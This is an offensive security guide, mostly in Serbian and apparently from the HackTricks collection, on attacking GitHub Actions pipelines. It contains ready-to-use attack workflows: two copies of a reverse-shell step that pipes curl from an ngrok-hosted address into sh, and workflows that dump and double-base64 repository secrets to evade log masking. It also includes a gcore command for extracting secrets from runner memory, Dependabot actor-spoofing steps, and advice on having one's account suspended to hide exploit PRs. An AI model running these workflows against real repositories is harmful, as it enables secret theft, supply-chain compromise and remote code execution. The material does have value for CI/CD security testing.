# Zloupotreba Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Alati

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Osnovne informacije

Na ovoj stranici ćete pronaći:

- **Sažetak svih uticaja** koje napadač može izazvati ako uspe da pristupi Github Action
- Različiti načini da **dobijete pristup action-u**:
- Imati **dozvole** za kreiranje action-a
- Zloupotreba trigera vezanih za **pull request**
- Zloupotreba drugih tehnika za **eksterni pristup**
- **Pivoting** iz već kompromitovanog repo-a
- Na kraju, sekcija o **post-exploitation techniques to abuse an action from inside** (koje izazivaju pomenute uticaje)

## Sažetak uticaja

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Ako možete **izvršiti proizvoljni kod u GitHub Actions** unutar **repozitorijuma**, možda ćete moći:

- **Steal secrets** montirane na pipeline i **abuse the pipeline's privileges** da dobijete neovlašćen pristup eksternim platformama, kao što su AWS i GCP.
- **Compromise deployments** i druge **artifacts**.
- Ako pipeline deployuje ili skladišti asset-e, možete izmeniti finalni proizvod, omogućavajući supply chain attack.
- **Execute code in custom workers** da zloupotrebite računarsku snagu i pivotujete na druge sisteme.
- **Overwrite repository code**, u zavisnosti od dozvola povezanih sa `GITHUB_TOKEN`.

## GITHUB_TOKEN

Ovaj "**secret**" (potekao iz `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) se dodeljuje kada admin omogući ovu opciju:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti koji će koristiti **Github Application**, tako da može pristupiti istim endpoint-ima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github bi trebao objaviti a [**flow**](https://github.com/github/roadmap/issues/74) koji **omogućava cross-repository** pristup unutar GitHub-a, tako da repo može pristupiti drugim internim repozitorijumima koristeći `GITHUB_TOKEN`.

Možete videti moguće **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Imajte na umu da token **ističe nakon završetka job-a**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Neke zanimljive stvari koje možete uraditi sa ovim tokenom:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Imajte na umu da ćete u više navrata moći da pronađete **github user tokens inside Github Actions envs or in the secrets**. Ovi tokeni vam mogu dati više privilegija nad repozitorijumom i organizacijom.

<details>

<summary>Lista secrets u izlazu Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijte reverse shell pomoću secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Moguće je proveriti dozvole dodeljene Github Token-u u repozitorijumima drugih korisnika **proverom logova** actions-a:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Allowed Execution

> [!NOTE]
> Ovo bi bio najlakši način da kompromitujete Github actions, pošto ovaj slučaj pretpostavlja da imate pristup da **napravite novi repo u organizaciji**, ili imate **prava za pisanje nad repozitorijumom**.
>
> Ako ste u ovoj situaciji možete jednostavno pogledati [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Execution from Repo Creation

U slučaju da članovi organizacije mogu **create new repos** i možete izvršavati Github actions, možete **create a new repo and steal the secrets set at organization level**.

### Execution from a New Branch

Ako možete **create a new branch in a repository that already contains a Github Action** konfigurisan, možete ga **izmeniti**, **otpremiti** sadržaj, i potom **pokrenuti tu akciju iz nove grane**. Na ovaj način možete **eksfiltrirati secrets sa nivoa repozitorijuma i organizacije** (ali morate znati kako se zovu).

> [!WARNING]
> Svako ograničenje implementirano samo unutar workflow YAML (na primer, `on: push: branches: [main]`, job conditionals, or manual gates) može biti izmenjeno od strane kolaboratora. Bez spoljnog sprovođenja (branch protections, protected environments, and protected tags), saradnik može preusmeriti workflow da se pokrene na njegovoj grani i zloupotrebiti montirane secrets/permissions.

Možete učiniti izmenjenu akciju izvršnom **ručno,** kada je **PR je kreiran** ili kada se **neki kod otpremi** (u zavisnosti od toga koliko želite da budete bučni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Izvršavanje iz fork-a

> [!NOTE]
> Postoje različiti trigger-i koji mogu omogućiti napadaču da **execute a Github Action of another repository**. Ako su ti triggeri loše konfigurisani, napadač ih može kompromitovati.

### `pull_request`

The workflow trigger **`pull_request`** će izvršiti workflow svaki put kada se primi pull request, sa nekim izuzecima: po defaultu, ako je to **prvi put** da doprinosite, neki **maintainer** će morati da **odobri** **pokretanje** workflow-a:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Pošto je **podrazumevano ograničenje** za **prvog doprinostioca**, možete poslati doprinos koji ispravlja validan bug/typo, a zatim poslati **druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije**.
>
> **Testirao sam i ovo ne radi**: ~~Druga opcija bi bila napraviti nalog sa imenom nekog ko je doprineo projektu i obrisao svoj nalog.~~

Pored toga, po defaultu to **onemogućava write permissions** i **pristup secrets** ciljanom repozitorijumu kao što je pomenuto u [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Napadač bi mogao izmeniti definiciju Github Action-a kako bi izvršio proizvoljne stvari i dodao proizvoljne akcije. Međutim, neće moći da ukrade secrets ili prepiše repo zbog pomenutih ograničenja.

> [!CAUTION]
> **Da, ako napadač u PR-u promeni github action koji će biti pokrenut, njegov Github Action će biti taj koji se koristi, a ne onaj iz originalnog repozitorijuma!**

Pošto napadač takođe kontroliše kod koji se izvršava, čak i ako nema pristup secret-ima ili write permisijama preko `GITHUB_TOKEN`, napadač bi, na primer, mogao **postaviti maliciozne artefakte**.

### **`pull_request_target`**

The workflow trigger **`pull_request_target`** ima **write permission** nad ciljnim repozitorijumom i **pristup secret-ima** (i ne traži odobrenje).

Napomena da workflow trigger **`pull_request_target`** **radi u base kontekstu** a ne u onom koji daje PR (kako bi se **neizvršavao nepoverljivi kod**). Za više informacija o `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Za više detalja o ovom specifično opasnom scenariju pogledajte ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Može delovati da je bezbedno koristiti **`pull_request_target`** jer se **izvršeni workflow** definiše u **base**, a **ne u PR-u**, ali postoji nekoliko slučajeva gde to nije sigurno.

I ovaj trigger će imati **pristup secret-ima**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger omogućava pokretanje workflow-a iz drugog kada je on `completed`, `requested` ili `in_progress`.

U ovom primeru, workflow je konfigurisan da se pokrene nakon što se zaseban "Run Tests" workflow završi:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Pored toga, prema dokumentaciji: Workflow pokrenut događajem `workflow_run` može da **pristupi secrets i upisuje tokens, čak i ako prethodni workflow to nije mogao**.

Ovakav workflow može biti napadnut ako se **oslanja** na **workflow** koji može biti **pokrenut** od strane eksternog korisnika putem **`pull_request`** ili **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi se sastoji u tome da workflow pokrenut događajem **`workflow_run`** preuzme napadačev kod: `${{ github.event.pull_request.head.sha }}`\
Drugi se sastoji u **prosleđivanju** **artifact** iz **untrusted** koda u **`workflow_run`** workflow i korišćenju sadržaja tog artifact-a na način koji ga čini **podložnim RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvršava iz `pull_request` koristi/preuzima kod iz originalnog repozitorijuma ili iz forkovanog PR-a

## Zloupotreba izvršavanja iz fork-ova

Spomenuli smo sve načine na koje eksterni napadač može naterati github workflow da se izvrši; sada pogledajmo kako se ta izvršavanja, ako su loše konfigurisana, mogu zloupotrebiti:

### Izvršavanje nepoverljivog checkout-a

U slučaju **`pull_request`,** workflow će se izvršiti u **kontekstu PR-a** (tako da će izvršiti **maliciozni kod PR-a**), ali neko mora **prvo autorizovati** i izvršavaće se sa određenim [ograničenjima](#pull_request).

U slučaju workflow-a koji koristi **`pull_request_target` or `workflow_run`** i koji zavisi od workflow-a koji može biti pokrenut putem **`pull_request_target` or `pull_request`**, izvršiće se kod iz originalnog repozitorijuma, pa **napadač ne može kontrolisati izvršeni kod**.

> [!CAUTION]
> Međutim, ako **action** ima **eksplicitan PR checkout** koji će **dovesti kod iz PR-a** (a ne iz base), koristiće kod koji kontroliše napadač. Na primer (pogledajte liniju 12 gde se preuzima kod iz PR-a):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepoverljivi kod se izvršava tokom `npm install` ili `npm build`** jer su build skripte i referencirani **packages kontrolisani od strane autora PR-a**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Imajte na umu da postoje određeni [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) čije su vrednosti **kontrolisane** od strane **user-a** koji kreira PR. Ako github action koristi te **data za izvršavanje bilo čega**, to može dovesti do **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Prema dokumentaciji: Možete učiniti **environment variable dostupnom za sve naredne korake** u workflow job-u definisanjem ili ažuriranjem promenljive okruženja i upisivanjem u **`GITHUB_ENV`** environment file.

Ako napadač može **ubaciti bilo koju vrednost** u ovu **env** promenljivu, može ubaciti env promenljive koje mogu izvršiti kod u narednim koracima, kao što su **LD_PRELOAD** ili **NODE_OPTIONS**.

Na primer ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje uploadovanom artifact-u da sačuva njegov sadržaj unutar **`GITHUB_ENV`** env promenljive. Napadač bi mogao uploadovati nešto ovako da ga kompromituje:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot i drugi pouzdani botovi

Kao što je navedeno u [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), nekoliko organizacija ima Github Action koja merge-uje bilo koji PRR od `dependabot[bot]` kao u:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Što je problem zato što polje `github.actor` sadrži korisnika koji je izazvao poslednji događaj koji je pokrenuo workflow. Postoji nekoliko načina da se natera `dependabot[bot]` korisnik da izmeni PR. Na primer:

- Napravite fork repozitorijuma žrtve
- Dodajte maliciozni payload u svoju kopiju
- Omogućite Dependabot na svom forku dodavanjem zastarele zavisnosti. Dependabot će kreirati granu koja ispravlja zavisnost sa malicioznim kodom.
- Otvorite Pull Request ka repozitorijumu žrtve iz te grane (PR će biti kreiran od strane korisnika, tako da se još ništa neće desiti)
- Zatim se napadač vraća na inicijalni PR koji je Dependabot otvorio u njegovom forku i pokreće `@dependabot recreate`
- Nakon toga, Dependabot izvrši neke akcije u toj grani koje izmenjuju PR na repozitorijumu žrtve, što postavlja `dependabot[bot]` kao korisnika poslednjeg događaja koji je pokrenuo workflow (i stoga se workflow izvršava).

Dalje, šta ako umesto merge-a Github Action ima command injection kao u:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Dakle, originalni blog post predlaže dve opcije za zloupotrebu ovog ponašanja, od kojih je druga:

- Fork the victim repository i omogući Dependabot sa nekom zastarelom zavisnošću.
- Kreiraj novu branch sa malicioznim shell injection kodom.
- Promeni default branch repozitorijuma na taj branch.
- Kreiraj PR iz tog brancha u repozitorijum žrtve.
- Pokreni `@dependabot merge` u PR-u koji je Dependabot otvorio u svom forku.
- Dependabot će spojiti njegove izmene u default branch vašeg forkovanog repozitorijuma, ažurirajući PR u repozitorijumu žrtve, čime će `dependabot[bot]` postati akter poslednjeg događaja koji je pokrenuo workflow i koristiće maliciozno ime brancha.

### Ranljive Github Actions trećih strana

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

Problem je u tome što, ako parametar **`path`** nije postavljen, artefakt se ekstrahuje u trenutni direktorijum i može prebrisati fajlove koji se kasnije mogu koristiti ili čak izvršiti u workflow-u. Dakle, ako je artefakt ranjiv, napadač može ovo iskoristiti da kompromituje druge workflow-e koji veruju tom artefaktu.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo se može napasti ovim workflow-om:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Ostali eksterni pristup

### Deleted Namespace Repo Hijacking

Ako nalog promeni ime, drugi korisnik može da registruje nalog sa tim imenom nakon nekog vremena. Ako je repository imao **less than 100 stars previously to the change of nam**e, Github će dozvoliti novom registrovanom korisniku sa istim imenom da kreira **repository with the same name** kao onaj koji je obrisan.

> [!CAUTION]
> Dakle, ako action koristi repo iz nepostojećeg naloga, i dalje je moguće da napadač kreira taj nalog i kompromituje action.

Ako drugi repositories koriste **dependencies from this user repos**, napadač će moći da ih hijack-uje. Ovde imate potpunije objašnjenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> U ovom odeljku govorićemo o tehnikama koje omogućavaju da se **pivot from one repo to another** pod pretpostavkom da imamo neki vid pristupa prvom (pogledajte prethodni odeljak).

### Cache Poisoning

A cache se održava između **wokflow runs in the same branch**. To znači da ako napadač uspe da **compromise** neki **package** koji se onda čuva u cache-u i bude **downloaded** i izvršen od strane **more privileged** workflow-a, biće u stanju da **compromise** i taj workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows mogu koristiti **artifacts from other workflows and even repos**; ako napadač uspe da **compromise** Github Action koja **uploads an artifact** koji se kasnije koristi u drugom workflow-u, mogao bi da **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

Kao što je navedeno u [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), čak i ako repository ili organizacija ima politiku koja ograničava korišćenje određenih actions, napadač može jednostavno da download-uje (`git clone`) action unutar workflow-a i potom ga referencira kao local action. Pošto politike ne utiču na lokalne putanje, **the action will be executed without any restriction.**

Primer:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Pristupanje AWS, Azure i GCP preko OIDC

Pogledajte sledeće stranice:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/azure-security/az-basic-information/az-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Pristupanje tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadržaj u skriptu, korisno je znati kako možete pristupiti tajnama:

- Ako je secret ili token postavljen kao **environment variable**, može se direktno pristupiti iz okruženja koristeći **`printenv`**.

<details>

<summary>Prikaži secrets u Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijte reverse shell with secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Ako se secret koristi **direktno u izrazu**, generisani shell skript se čuva **na disku** i dostupan je.
- ```bash
cat /home/runner/work/_temp/*
```
- Za JavaScript actions secrets se šalju kroz environment variables
- ```bash
ps axe | grep node
```
- Za **custom action**, rizik može varirati u zavisnosti od toga kako program koristi secret koji je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerišite sve secrets preko secrets context (collaborator nivo). Kontributor sa write pristupom može izmeniti workflow na bilo kojoj grani da iskopira sve repository/org/environment secrets. Koristite double base64 da izbegnete GitHub-ovo maskiranje logova i dekodirajte lokalno:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Dekodirajte lokalno:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Savet: za prikrivanje tokom testiranja, enkriptujte pre štampanja (openssl je predinstaliran na GitHub-hosted runner-ima).

### Zloupotreba Self-hosted runners

Način da se pronađe koje **Github Actions are being executed in non-github infrastructure** je da se pretraži **`runs-on: self-hosted`** u Github Action konfiguracionom yaml-u.

**Self-hosted** runners mogu imati pristup **extra sensitive information**, drugim **network systems** (ranjivi endpoints u mreži? metadata service?) ili, čak i ako su izolovani i uništeni, **više od jedne action može biti pokrenuto u isto vreme** i zlonamerna može **steal the secrets** druge.

Na self-hosted runner-ima je takođe moguće dobiti **secrets from the \_Runner.Listener**\_\*\* process\*\* koji će sadržati sve secrets workflow-ova u bilo kom koraku, iskopiranjem njegove memorije:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Pogledajte [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Moguće je napraviti Github actions koji će **izgraditi i sačuvati Docker image unutar Github-a**.\
Primer možete naći u sledećem proširivom odeljku:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao što možete videti u prethodnom kodu, Github registry je hostovan na **`ghcr.io`**.

Korisnik sa read permissions nad repozitorijumom će tada moći da preuzme Docker Image koristeći personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik bi mogao da potraži **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Osetljivi podaci u Github Actions logovima

Čak i ako **Github** pokuša da **otkrije vrednosti tajni** u logovima akcija i **izbegne njihovo prikazivanje**, **drugi osetljivi podaci** koji su mogli biti generisani tokom izvršenja akcije neće biti sakriveni. Na primer, JWT potpisan tajnom vrednošću neće biti sakriven osim ako nije [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Skrivanje tragova

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Pre svega, svaki podnet PR je jasno vidljiv javnosti na Github i ciljanom GitHub nalogu. U GitHub-u po defaultu, mi **ne možemo obrisati PR sa interneta**, ali postoji caka. Za Github naloge koji su **suspendovani** od strane Github-a, svi njihovi **PR-ovi se automatski brišu** i uklanjaju sa interneta. Dakle, da biste sakrili svoju aktivnost, morate ili da vam **GitHub nalog bude suspendovan ili da vam nalog bude označen**. Ovo bi **sakrilo sve vaše aktivnosti** na GitHub-u sa interneta (u suštini uklonilo sve vaše exploit PR).

Organizacija na GitHub-u je veoma proaktivna u prijavljivanju naloga GitHub-u. Sve što treba da uradite je da podelite “neke stvari” u Issue i oni će se pobrinuti da vam nalog bude suspendovan u roku od 12 sati :p i eto — vaš exploit postaje nevidljiv na github.

> [!WARNING]
> Jedini način da organizacija otkrije da je bila meta jeste da proveri GitHub logove iz SIEM-a pošto će iz GitHub UI PR biti uklonjen.

## Reference

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
